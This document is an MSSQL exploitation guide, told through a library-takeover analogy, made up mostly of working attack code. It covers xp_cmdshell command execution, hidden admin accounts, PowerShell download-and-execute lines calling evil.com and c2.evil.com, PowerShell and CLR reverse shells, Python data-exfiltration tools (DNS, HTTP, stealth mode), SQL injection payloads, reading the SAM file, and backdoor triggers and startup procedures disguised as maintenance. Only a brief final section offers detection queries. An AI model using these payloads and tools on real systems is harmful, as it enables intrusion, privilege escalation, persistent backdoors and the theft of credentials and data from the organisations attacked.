# MSSQL Exploitation Techniques

## ELI5: The Library Takeover Playbook

Imagine you've gotten into the kingdom's grand library (SQL Server) with a librarian's keycard. Now you want to:
- Make the library computers run your commands (xp_cmdshell)
- Create secret doors only you know about (backdoors)
- Copy all the valuable books without anyone noticing (data exfiltration)
- Use the library's trusted status to access other buildings (lateral movement)
- Leave invisible listening devices everywhere (persistence)

## Table of Contents
1. [Command Execution Techniques](#command-execution-techniques)
2. [Data Exfiltration Methods](#data-exfiltration-methods)
3. [Stored Procedure Exploitation](#stored-procedure-exploitation)
4. [CLR Assembly Injection](#clr-assembly-injection)
5. [Persistence Mechanisms](#persistence-mechanisms)
6. [Advanced Exploitation Techniques](#advanced-exploitation-techniques)
7. [Living Off the Land](#living-off-the-land)

## Command Execution Techniques

### XP_CMDSHELL Exploitation

#### Enabling and Using XP_CMDSHELL
```sql
-- Enable xp_cmdshell (requires sysadmin)
-- Like getting the master key to all computers
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Execute commands
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user hacker P@ssw0rd123 /add'
EXEC xp_cmdshell 'net localgroup administrators hacker /add'

-- Execute PowerShell
EXEC xp_cmdshell 'powershell -enc <base64_payload>'

-- Download and execute
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://evil.com/shell.ps1'')"'
```

#### Advanced Command Execution
```python
#!/usr/bin/env python3
# mssql_cmdexec.py - Advanced command execution via MSSQL

import pymssql
import base64
import subprocess

class MSSQLCommandExecution:
    """Advanced MSSQL command execution"""

    def __init__(self, server, username, password):
        self.conn = pymssql.connect(server, username, password)
        self.cursor = self.conn.cursor()
        self.xp_cmdshell_enabled = False

    def enable_xp_cmdshell(self):
        """Enable xp_cmdshell if disabled"""
        try:
            # Check if already enabled
            self.cursor.execute("EXEC xp_cmdshell 'echo test'")
            self.xp_cmdshell_enabled = True
            return True
        except:
            pass

        try:
            # Enable advanced options
            self.cursor.execute("""
                EXEC sp_configure 'show advanced options', 1;
                RECONFIGURE;
            """)

            # Enable xp_cmdshell
            self.cursor.execute("""
                EXEC sp_configure 'xp_cmdshell', 1;
                RECONFIGURE;
            """)

            self.xp_cmdshell_enabled = True
            print("[+] xp_cmdshell enabled")
            return True

        except Exception as e:
            print(f"[-] Failed to enable xp_cmdshell: {e}")
            return False

    def execute_command(self, command):
        """Execute OS command and return output"""
        if not self.xp_cmdshell_enabled:
            if not self.enable_xp_cmdshell():
                return None

        # Execute command
        self.cursor.execute(f"EXEC xp_cmdshell '{command}'")

        # Get output
        output = []
        for row in self.cursor:
            if row[0]:
                output.append(row[0])

        return '\n'.join(output)

    def execute_powershell(self, script):
        """Execute PowerShell script"""
        # Encode script
        encoded = base64.b64encode(script.encode('utf-16-le')).decode()

        # Execute via xp_cmdshell
        command = f'powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}'
        return self.execute_command(command)

    def download_execute(self, url, output_path='C:\\Windows\\Temp\\payload.exe'):
        """Download and execute payload"""
        download_script = f"""
            $client = New-Object System.Net.WebClient
            $client.DownloadFile('{url}', '{output_path}')
            Start-Process '{output_path}'
        """
        return self.execute_powershell(download_script)

    def create_admin_user(self, username='backdoor', password='P@ssw0rd123'):
        """Create local administrator account"""
        commands = [
            f'net user {username} {password} /add',
            f'net localgroup administrators {username} /add',
            f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v {username} /t REG_DWORD /d 0 /f'
        ]

        for cmd in commands:
            result = self.execute_command(cmd)
            print(f"[*] {cmd}: {result}")

    def reverse_shell(self, lhost, lport):
        """Establish reverse shell"""
        reverse_shell_script = f"""
            $client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
            $stream = $client.GetStream();
            [byte[]]$bytes = 0..65535|%{{0}};
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                $sendback = (iex $data 2>&1 | Out-String );
                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                $stream.Write($sendbyte,0,$sendbyte.Length);
                $stream.Flush()
            }};
            $client.Close()
        """
        return self.execute_powershell(reverse_shell_script)
```

### Alternative Command Execution

#### OLE Automation Procedures
```sql
-- Enable OLE automation
-- Like getting access to the library's automation system
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

-- Execute commands via OLE
DECLARE @Shell INT
DECLARE @Output VARCHAR(8000)

EXEC sp_OACreate 'WScript.Shell', @Shell OUTPUT
EXEC sp_OAMethod @Shell, 'Run', NULL, 'cmd /c whoami > C:\output.txt', 0, 'False'
EXEC sp_OADestroy @Shell

-- Read output
CREATE TABLE #output (line VARCHAR(8000))
BULK INSERT #output FROM 'C:\output.txt'
SELECT * FROM #output
DROP TABLE #output
```

#### Agent Job Execution
```sql
-- Create SQL Agent job for command execution
-- Like scheduling a task for the library robots
USE msdb
GO

EXEC sp_add_job
    @job_name = 'SystemMaintenance',
    @enabled = 1,
    @delete_level = 1

EXEC sp_add_jobstep
    @job_name = 'SystemMaintenance',
    @step_name = 'Execute',
    @subsystem = 'CmdExec',
    @command = 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://evil.com/payload.ps1'')"',
    @retry_attempts = 1,
    @retry_interval = 5

EXEC sp_add_jobserver
    @job_name = 'SystemMaintenance',
    @server_name = '(LOCAL)'

EXEC sp_start_job @job_name = 'SystemMaintenance'
```

## Data Exfiltration Methods

### Bulk Data Export

#### High-Speed Data Extraction
```python
#!/usr/bin/env python3
# mssql_exfiltrate.py - Efficient data exfiltration

import pymssql
import csv
import gzip
import requests
from datetime import datetime

class MSSQLExfiltrator:
    """Efficient MSSQL data exfiltration"""

    def __init__(self, server, username, password):
        self.conn = pymssql.connect(server, username, password)
        self.cursor = self.conn.cursor()

    def enumerate_databases(self):
        """Get all databases and tables"""
        databases = {}

        # Get databases
        self.cursor.execute("SELECT name FROM sys.databases WHERE database_id > 4")
        for row in self.cursor:
            db_name = row[0]
            databases[db_name] = []

            # Get tables for each database
            self.cursor.execute(f"""
                SELECT TABLE_SCHEMA, TABLE_NAME, TABLE_TYPE
                FROM [{db_name}].INFORMATION_SCHEMA.TABLES
            """)

            for table_row in self.cursor:
                databases[db_name].append({
                    'schema': table_row[0],
                    'table': table_row[1],
                    'type': table_row[2]
                })

        return databases

    def identify_sensitive_data(self):
        """Find potentially sensitive tables"""
        keywords = ['password', 'credit', 'ssn', 'secret', 'key', 'token',
                   'auth', 'login', 'user', 'account', 'payment', 'salary']

        sensitive_tables = []

        databases = self.enumerate_databases()
        for db, tables in databases.items():
            for table_info in tables:
                table_name = table_info['table'].lower()

                # Check table name
                if any(kw in table_name for kw in keywords):
                    sensitive_tables.append(f"{db}.{table_info['schema']}.{table_info['table']}")

                # Check column names
                self.cursor.execute(f"""
                    SELECT COLUMN_NAME
                    FROM [{db}].INFORMATION_SCHEMA.COLUMNS
                    WHERE TABLE_NAME = '{table_info['table']}'
                """)

                for col in self.cursor:
                    if any(kw in col[0].lower() for kw in keywords):
                        sensitive_tables.append(f"{db}.{table_info['schema']}.{table_info['table']}")
                        break

        return list(set(sensitive_tables))

    def export_table(self, table_name, chunk_size=10000):
        """Export table data in chunks"""
        # Get total row count
        self.cursor.execute(f"SELECT COUNT(*) FROM {table_name}")
        total_rows = self.cursor.fetchone()[0]

        print(f"[*] Exporting {total_rows} rows from {table_name}")

        exported_data = []
        offset = 0

        while offset < total_rows:
            # Fetch chunk
            self.cursor.execute(f"""
                SELECT * FROM {table_name}
                ORDER BY 1
                OFFSET {offset} ROWS
                FETCH NEXT {chunk_size} ROWS ONLY
            """)

            # Get column names
            if offset == 0:
                columns = [desc[0] for desc in self.cursor.description]
                exported_data.append(columns)

            # Add rows
            for row in self.cursor:
                exported_data.append(row)

            offset += chunk_size
            print(f"    Exported {min(offset, total_rows)}/{total_rows} rows")

        return exported_data

    def compress_data(self, data, filename):
        """Compress exported data"""
        with gzip.open(f'{filename}.gz', 'wt', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerows(data)

    def exfiltrate_via_dns(self, data, domain):
        """Exfiltrate data via DNS queries"""
        import base64

        # Encode data
        encoded = base64.b64encode(str(data).encode()).decode()

        # Split into chunks for DNS labels (63 chars max)
        chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]

        for i, chunk in enumerate(chunks):
            # DNS query format: chunk.index.total.domain
            dns_query = f"{chunk}.{i}.{len(chunks)}.{domain}"

            # Trigger DNS resolution
            self.cursor.execute(f"EXEC master.sys.xp_dirtree '\\\\{dns_query}\\share'")

    def exfiltrate_via_http(self, data, url):
        """Exfiltrate data via HTTP POST"""
        # Convert data to JSON
        import json
        json_data = json.dumps(data)

        # Split into chunks if needed
        max_size = 1024 * 1024  # 1MB chunks
        if len(json_data) > max_size:
            chunks = [json_data[i:i+max_size] for i in range(0, len(json_data), max_size)]

            for i, chunk in enumerate(chunks):
                requests.post(url, data={'chunk': i, 'data': chunk})
        else:
            requests.post(url, data={'data': json_data})

    def stealth_exfiltration(self, table_name):
        """Slow, stealthy data exfiltration"""
        import time
        import random

        # Export small chunks with delays
        chunk_size = random.randint(50, 200)
        delay = random.randint(30, 120)

        print(f"[*] Stealth mode: {chunk_size} rows every {delay} seconds")

        self.cursor.execute(f"SELECT COUNT(*) FROM {table_name}")
        total_rows = self.cursor.fetchone()[0]

        for offset in range(0, total_rows, chunk_size):
            # Extract chunk
            self.cursor.execute(f"""
                SELECT * FROM {table_name}
                ORDER BY 1
                OFFSET {offset} ROWS
                FETCH NEXT {chunk_size} ROWS ONLY
            """)

            data = self.cursor.fetchall()

            # Exfiltrate chunk
            # This would send to C2 server
            print(f"    Exfiltrated {offset + len(data)}/{total_rows} rows")

            # Random delay
            time.sleep(delay + random.randint(-10, 10))
```

### Database Backup Abuse

#### Backup to Attacker Share
```sql
-- Backup database to network share
-- Like copying the entire library to your truck
BACKUP DATABASE SensitiveDB
TO DISK = '\\attacker-server\backup\db.bak'
WITH FORMAT, INIT

-- Backup specific tables via SELECT INTO
SELECT * INTO OPENROWSET(
    'Microsoft.ACE.OLEDB.12.0',
    'Excel 12.0;Database=\\attacker-server\data.xlsx',
    'SELECT * FROM [Sheet1$]'
) FROM SensitiveTable

-- Copy backup to accessible location
EXEC xp_cmdshell 'copy C:\Backup\master.bak \\attacker-server\loot\'
```

## Stored Procedure Exploitation

### SQL Injection in Stored Procedures

#### Exploiting Dynamic SQL
```sql
-- Vulnerable stored procedure
-- Like a librarian who blindly follows any instruction
CREATE PROCEDURE sp_SearchUsers
    @SearchTerm NVARCHAR(100)
AS
BEGIN
    DECLARE @sql NVARCHAR(1000)
    SET @sql = 'SELECT * FROM Users WHERE Username LIKE ''%' + @SearchTerm + '%'''
    EXEC(@sql)
END

-- Exploitation
EXEC sp_SearchUsers ''' OR 1=1; EXEC xp_cmdshell ''net user hacker P@ss /add'' --'

-- Advanced exploitation with stacked queries
EXEC sp_SearchUsers ''';
    DECLARE @cmd VARCHAR(8000);
    SET @cmd = ''powershell -c "IEX(New-Object Net.WebClient).DownloadString(''''http://evil.com/shell.ps1'''')"'';
    EXEC xp_cmdshell @cmd;
    --'
```

#### Stored Procedure Privilege Escalation
```python
#!/usr/bin/env python3
# sp_exploit.py - Exploit stored procedures for privilege escalation

class StoredProcedureExploit:
    """Exploit vulnerable stored procedures"""

    def find_vulnerable_procedures(self, cursor):
        """Find procedures with dynamic SQL"""
        vulnerable = []

        cursor.execute("""
            SELECT
                p.name AS ProcName,
                m.definition,
                p.create_date,
                USER_NAME(p.principal_id) as Owner
            FROM sys.procedures p
            JOIN sys.sql_modules m ON p.object_id = m.object_id
            WHERE m.definition LIKE '%EXEC(%'
               OR m.definition LIKE '%sp_executesql%'
               OR m.definition LIKE '%EXECUTE(%'
        """)

        for row in cursor:
            proc_name = row[0]
            definition = row[1]
            owner = row[3]

            # Check for unsafe concatenation
            if ('+' in definition and '@' in definition) or \
               ('EXEC(' in definition and '@' in definition):
                vulnerable.append({
                    'procedure': proc_name,
                    'owner': owner,
                    'definition': definition[:500]  # First 500 chars
                })

        return vulnerable

    def exploit_execute_as(self, cursor, proc_name):
        """Exploit EXECUTE AS in stored procedures"""
        # Create malicious procedure
        exploit_sql = f"""
        ALTER PROCEDURE {proc_name}
        WITH EXECUTE AS OWNER
        AS
        BEGIN
            -- Add sysadmin
            ALTER SERVER ROLE sysadmin ADD MEMBER [domain\\attacker]

            -- Enable xp_cmdshell
            EXEC sp_configure 'show advanced options', 1
            RECONFIGURE
            EXEC sp_configure 'xp_cmdshell', 1
            RECONFIGURE

            -- Execute payload
            EXEC xp_cmdshell 'powershell -enc <base64_payload>'
        END
        """

        try:
            cursor.execute(exploit_sql)
            print(f"[+] Modified {proc_name} for privilege escalation")
            return True
        except Exception as e:
            print(f"[-] Failed to modify {proc_name}: {e}")
            return False

    def inject_into_procedure(self, cursor, proc_name, payload):
        """Inject payload into existing procedure"""
        # Get current definition
        cursor.execute(f"""
            SELECT definition
            FROM sys.sql_modules
            WHERE object_id = OBJECT_ID('{proc_name}')
        """)

        original_def = cursor.fetchone()[0]

        # Inject payload at beginning
        modified_def = original_def.replace(
            'BEGIN',
            f'BEGIN\n    -- Injected\n    {payload}\n    -- End injection\n'
        )

        # Recreate procedure
        cursor.execute(f"DROP PROCEDURE {proc_name}")
        cursor.execute(modified_def)

        print(f"[+] Injected payload into {proc_name}")
```

## CLR Assembly Injection

### Custom CLR Assembly Creation

#### C# Assembly for Command Execution
```csharp
// MSSQLCommand.cs - CLR assembly for command execution
using System;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Diagnostics;
using System.IO;

public class StoredProcedures
{
    [SqlProcedure]
    public static void ExecuteCommand(SqlString command)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + command.Value;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.RedirectStandardError = true;
        proc.Start();

        // Send output back to SQL Server
        SqlContext.Pipe.Send(proc.StandardOutput.ReadToEnd());
        SqlContext.Pipe.Send(proc.StandardError.ReadToEnd());
        proc.WaitForExit();
    }

    [SqlFunction(DataAccess = DataAccessKind.Read)]
    public static SqlString GetSystemInfo()
    {
        string info = String.Format(
            "Machine: {0}\nUser: {1}\nDomain: {2}\nOS: {3}",
            Environment.MachineName,
            Environment.UserName,
            Environment.UserDomainName,
            Environment.OSVersion
        );
        return new SqlString(info);
    }

    [SqlProcedure]
    public static void DownloadExecute(SqlString url, SqlString path)
    {
        using (var client = new System.Net.WebClient())
        {
            client.DownloadFile(url.Value, path.Value);
        }

        Process.Start(path.Value);
        SqlContext.Pipe.Send("Payload downloaded and executed");
    }
}
```

#### Deploying CLR Assembly
```sql
-- Enable CLR
-- Like installing a new computer system in the library
EXEC sp_configure 'clr enabled', 1
RECONFIGURE

-- Mark database as trustworthy (requires db_owner)
ALTER DATABASE [targetdb] SET TRUSTWORTHY ON

-- Create assembly from hex bytes
CREATE ASSEMBLY [MSSQLCommand]
AUTHORIZATION [dbo]
FROM 0x4D5A90000300000004000000FFFF... -- Compiled DLL in hex
WITH PERMISSION_SET = UNSAFE

-- Create stored procedures from assembly
CREATE PROCEDURE [dbo].[ExecuteCommand]
    @command NVARCHAR(4000)
AS EXTERNAL NAME [MSSQLCommand].[StoredProcedures].[ExecuteCommand]

-- Use the CLR procedure
EXEC ExecuteCommand 'whoami'
EXEC ExecuteCommand 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://evil.com/payload.ps1'')"'
```

#### Automated CLR Deployment
```python
#!/usr/bin/env python3
# clr_inject.py - Automate CLR assembly injection

import subprocess
import base64

class CLRInjector:
    """Inject CLR assemblies into MSSQL"""

    def compile_assembly(self, source_code):
        """Compile C# to DLL"""
        # Save source
        with open('payload.cs', 'w') as f:
            f.write(source_code)

        # Compile
        cmd = [
            'csc.exe',
            '/target:library',
            '/reference:System.Data.dll',
            '/out:payload.dll',
            'payload.cs'
        ]
        subprocess.run(cmd)

        # Convert to hex
        with open('payload.dll', 'rb') as f:
            dll_bytes = f.read()

        hex_string = '0x' + dll_bytes.hex()
        return hex_string

    def deploy_assembly(self, cursor, assembly_hex):
        """Deploy CLR assembly to MSSQL"""
        try:
            # Enable CLR
            cursor.execute("""
                EXEC sp_configure 'clr enabled', 1;
                RECONFIGURE;
            """)

            # Set trustworthy
            cursor.execute("ALTER DATABASE [master] SET TRUSTWORTHY ON")

            # Create assembly
            cursor.execute(f"""
                CREATE ASSEMBLY [Payload]
                AUTHORIZATION [dbo]
                FROM {assembly_hex}
                WITH PERMISSION_SET = UNSAFE
            """)

            # Create procedures
            cursor.execute("""
                CREATE PROCEDURE [dbo].[RunCommand]
                    @cmd NVARCHAR(4000)
                AS EXTERNAL NAME [Payload].[StoredProcedures].[ExecuteCommand]
            """)

            print("[+] CLR assembly deployed successfully")
            return True

        except Exception as e:
            print(f"[-] Deployment failed: {e}")
            return False

    def generate_payload(self, payload_type='reverse_shell'):
        """Generate CLR payload"""
        if payload_type == 'reverse_shell':
            return """
            using System;
            using System.Net.Sockets;
            using System.IO;
            using Microsoft.SqlServer.Server;

            public class Payload
            {
                [SqlProcedure]
                public static void ReverseShell(string host, int port)
                {
                    try {
                        TcpClient client = new TcpClient(host, port);
                        Stream stream = client.GetStream();
                        StreamReader reader = new StreamReader(stream);
                        StreamWriter writer = new StreamWriter(stream);

                        while (true) {
                            writer.Write("PS> ");
                            writer.Flush();
                            string cmd = reader.ReadLine();

                            if (cmd.ToLower() == "exit") break;

                            var proc = new System.Diagnostics.Process();
                            proc.StartInfo.FileName = "powershell.exe";
                            proc.StartInfo.Arguments = "-c " + cmd;
                            proc.StartInfo.UseShellExecute = false;
                            proc.StartInfo.RedirectStandardOutput = true;
                            proc.Start();

                            writer.WriteLine(proc.StandardOutput.ReadToEnd());
                            writer.Flush();
                        }

                        client.Close();
                    }
                    catch (Exception e) {
                        SqlContext.Pipe.Send(e.Message);
                    }
                }
            }
            """
```

## Persistence Mechanisms

### Backdoor Creation

#### Trigger-based Backdoor
```sql
-- Create backdoor trigger
-- Like a hidden alarm that executes your code
CREATE TRIGGER [LoginBackdoor]
ON ALL SERVER
FOR LOGON
AS
BEGIN
    IF ORIGINAL_LOGIN() = 'normaluser'
    BEGIN
        -- Check for magic value
        DECLARE @host VARCHAR(100)
        SELECT @host = client_net_address
        FROM sys.dm_exec_connections
        WHERE session_id = @@SPID

        -- If connecting from specific IP, grant sysadmin
        IF @host = '10.10.10.10'
        BEGIN
            ALTER SERVER ROLE sysadmin ADD MEMBER [normaluser]
        END
    END
END

-- Time-based backdoor
CREATE PROCEDURE sp_ScheduledMaintenance
AS
BEGIN
    -- Looks legitimate but contains backdoor
    DECLARE @hour INT = DATEPART(HOUR, GETDATE())
    DECLARE @minute INT = DATEPART(MINUTE, GETDATE())

    -- Activate at 3:33 AM
    IF @hour = 3 AND @minute = 33
    BEGIN
        EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://c2.evil.com/beacon.ps1'')"'
    END

    -- Legitimate maintenance task
    EXEC sp_updatestats
END

-- Schedule to run every hour
EXEC sp_add_schedule
    @schedule_name = 'HourlyMaintenance',
    @freq_type = 4,
    @freq_interval = 1,
    @freq_subday_type = 8,
    @freq_subday_interval = 1
```

#### Extended Stored Procedure Backdoor
```c
// xp_backdoor.c - Custom extended stored procedure
#include <windows.h>
#include <sql.h>
#include <sqlext.h>

__declspec(dllexport) void xp_backdoor(char *command)
{
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    // Execute command
    CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Register in SQL Server
/*
EXEC sp_addextendedproc 'xp_backdoor', 'C:\Windows\System32\backdoor.dll'
EXEC xp_backdoor 'calc.exe'
*/
```

### Startup Procedure Persistence

```sql
-- Create startup procedure
-- Like programming the library to call you every morning
CREATE PROCEDURE sp_Startup
AS
BEGIN
    -- Check C2 server
    DECLARE @cmd VARCHAR(8000)
    SET @cmd = 'powershell -c "$r = Invoke-WebRequest -Uri http://c2.evil.com/check -UseBasicParsing; if($r.StatusCode -eq 200){IEX($r.Content)}"'

    EXEC xp_cmdshell @cmd, NO_OUTPUT

    -- Log to appear legitimate
    INSERT INTO SystemLog (EventTime, Event)
    VALUES (GETDATE(), 'System startup check completed')
END

-- Mark as startup procedure
EXEC sp_procoption @ProcName = 'sp_Startup',
    @OptionName = 'startup',
    @OptionValue = 'true'
```

## Advanced Exploitation Techniques

### Memory Scraping

```python
#!/usr/bin/env python3
# mssql_memory_scrape.py - Extract sensitive data from MSSQL memory

class MemoryScraper:
    """Scrape sensitive data from MSSQL memory"""

    def scrape_connection_strings(self, cursor):
        """Extract connection strings from memory"""
        cursor.execute("""
            SELECT
                session_id,
                login_name,
                host_name,
                program_name,
                client_interface_name,
                login_time,
                last_request_start_time,
                text
            FROM sys.dm_exec_sessions s
            CROSS APPLY sys.dm_exec_sql_text(s.most_recent_sql_handle) st
            WHERE text LIKE '%password%'
               OR text LIKE '%pwd%'
               OR text LIKE '%Data Source%'
        """)

        sensitive_data = []
        for row in cursor:
            # Parse for credentials
            text = row[7]
            if 'password=' in text.lower():
                sensitive_data.append({
                    'session': row[0],
                    'user': row[1],
                    'host': row[2],
                    'data': text[:200]  # First 200 chars
                })

        return sensitive_data

    def extract_cached_plans(self, cursor):
        """Extract sensitive data from cached query plans"""
        cursor.execute("""
            SELECT TOP 100
                creation_time,
                last_execution_time,
                execution_count,
                total_worker_time,
                statement_text = SUBSTRING(
                    qt.text,
                    qs.statement_start_offset/2 + 1,
                    (CASE WHEN qs.statement_end_offset = -1
                        THEN LEN(CONVERT(nvarchar(max), qt.text)) * 2
                        ELSE qs.statement_end_offset
                    END - qs.statement_start_offset)/2 + 1
                )
            FROM sys.dm_exec_query_stats qs
            CROSS APPLY sys.dm_exec_sql_text(qs.sql_handle) qt
            WHERE qt.text LIKE '%INSERT%'
               OR qt.text LIKE '%UPDATE%'
               OR qt.text LIKE '%password%'
            ORDER BY execution_count DESC
        """)

        return cursor.fetchall()

    def dump_session_context(self, cursor):
        """Dump all session context switches"""
        cursor.execute("""
            SELECT
                s.session_id,
                s.security_id,
                s.login_name,
                s.original_login_name,
                c.auth_scheme,
                c.net_transport,
                c.client_net_address,
                s.context_info
            FROM sys.dm_exec_sessions s
            JOIN sys.dm_exec_connections c ON s.session_id = c.session_id
            WHERE s.is_user_process = 1
        """)

        sessions = []
        for row in cursor:
            # Check for impersonation
            if row[2] != row[3]:  # login_name != original_login_name
                sessions.append({
                    'session': row[0],
                    'impersonating': row[2],
                    'original': row[3],
                    'address': row[6],
                    'context': row[7]
                })

        return sessions
```

### Token Impersonation

```sql
-- Impersonate high-privilege users
-- Like stealing and wearing the head librarian's badge
EXECUTE AS LOGIN = 'sa'
-- Commands run with sa privileges
SELECT SYSTEM_USER  -- Shows 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')  -- Returns 1
REVERT  -- Return to original context

-- Find users to impersonate
SELECT DISTINCT
    p.name AS principal_name,
    p.type_desc,
    r.name AS role_name,
    r.type_desc AS role_type
FROM sys.server_principals p
JOIN sys.server_role_members rm ON p.principal_id = rm.member_principal_id
JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
WHERE r.name = 'sysadmin'

-- Create impersonation chain
CREATE LOGIN [LowPrivUser] WITH PASSWORD = 'P@ssw0rd'
GRANT IMPERSONATE ON LOGIN::[sa] TO [LowPrivUser]

-- Now LowPrivUser can:
EXECUTE AS LOGIN = 'sa'
EXEC xp_cmdshell 'whoami'
REVERT
```

## Living Off the Land

### Built-in Tools Abuse

```sql
-- Use legitimate features for malicious purposes
-- Like using library equipment for unintended purposes

-- 1. BCP for data exfiltration
EXEC xp_cmdshell 'bcp "SELECT * FROM Database.dbo.Secrets" queryout "C:\temp\data.csv" -c -T -S localhost'

-- 2. SQLCMD for lateral movement
EXEC xp_cmdshell 'sqlcmd -S RemoteServer -E -Q "EXEC xp_cmdshell ''net user hacker P@ss /add''"'

-- 3. BULK INSERT for file reading
CREATE TABLE FileContent (line VARCHAR(8000))
BULK INSERT FileContent FROM 'C:\Windows\System32\config\SAM'
WITH (FIELDTERMINATOR = '\n', ROWTERMINATOR = '\n')
SELECT * FROM FileContent

-- 4. OPENROWSET for remote queries
SELECT * FROM OPENROWSET(
    'SQLNCLI',
    'Server=remote;Trusted_Connection=yes;',
    'SELECT * FROM master.sys.databases'
)

-- 5. sp_send_dbmail for exfiltration
EXEC msdb.dbo.sp_send_dbmail
    @recipients = 'attacker@evil.com',
    @subject = 'Database Backup',
    @body = 'Sensitive data attached',
    @query = 'SELECT * FROM CreditCards',
    @attach_query_result_as_file = 1,
    @query_attachment_filename = 'data.csv'
```

### PowerUpSQL Integration

```powershell
# Advanced exploitation with PowerUpSQL
# Like having a master key to all library systems

Import-Module .\PowerUpSQL.ps1

# Find and exploit all SQL servers
$servers = Get-SQLInstanceDomain -Verbose

foreach ($server in $servers) {
    # Check access
    $access = Get-SQLServerInfo -Instance $server

    if ($access) {
        # Enumerate privileges
        Get-SQLServerRole -Instance $server

        # Check for exploitable configurations
        Invoke-SQLAudit -Instance $server

        # Attempt privilege escalation
        Invoke-SQLEscalatePriv -Instance $server

        # If successful, execute commands
        if (Get-SQLSysadminCheck -Instance $server) {
            Get-SQLCmd -Instance $server -Query "EXEC xp_cmdshell 'whoami'"

            # Deploy persistence
            Get-SQLPersistTriggerDDL -Instance $server -PersistType LoginTrigger
        }

        # Check for linked servers
        $links = Get-SQLServerLink -Instance $server
        foreach ($link in $links) {
            Get-SQLServerLinkCrawl -Instance $server
        }
    }
}

# Mass command execution
Get-SQLInstanceDomain | Get-SQLSysadminCheck |
    Where-Object {$_.IsSysadmin -eq "Yes"} |
    ForEach-Object {
        Invoke-SQLOSCmd -Instance $_.Instance -Command "whoami" -RawResults
    }
```

## Defensive Countermeasures

### Detection Queries

```sql
-- Monitor for exploitation attempts
-- Security cameras and alarms for the library

-- 1. Detect xp_cmdshell usage
SELECT
    event_time,
    statement,
    succeeded,
    server_principal_name
FROM sys.fn_get_audit_file('C:\SQLAudit\*.sqlaudit', DEFAULT, DEFAULT)
WHERE statement LIKE '%xp_cmdshell%'
ORDER BY event_time DESC

-- 2. Monitor CLR assembly creation
SELECT
    a.name AS assembly_name,
    a.create_date,
    a.permission_set_desc,
    p.name AS principal_name
FROM sys.assemblies a
JOIN sys.database_principals p ON a.principal_id = p.principal_id
WHERE a.is_user_defined = 1
ORDER BY a.create_date DESC

-- 3. Track privilege changes
CREATE TRIGGER [PrivilegeAudit]
ON ALL SERVER
FOR ADD_SERVER_ROLE_MEMBER, DROP_SERVER_ROLE_MEMBER
AS
BEGIN
    DECLARE @data XML = EVENTDATA()

    INSERT INTO SecurityAudit (
        EventTime,
        EventType,
        LoginName,
        RoleName,
        MemberName
    )
    VALUES (
        GETDATE(),
        @data.value('(/EVENT_INSTANCE/EventType)[1]', 'varchar(100)'),
        @data.value('(/EVENT_INSTANCE/LoginName)[1]', 'varchar(100)'),
        @data.value('(/EVENT_INSTANCE/RoleName)[1]', 'varchar(100)'),
        @data.value('(/EVENT_INSTANCE/ObjectName)[1]', 'varchar(100)')
    )
END
```

This comprehensive guide covers advanced MSSQL exploitation techniques from command execution through persistence, with practical code examples and clear explanations for security professionals.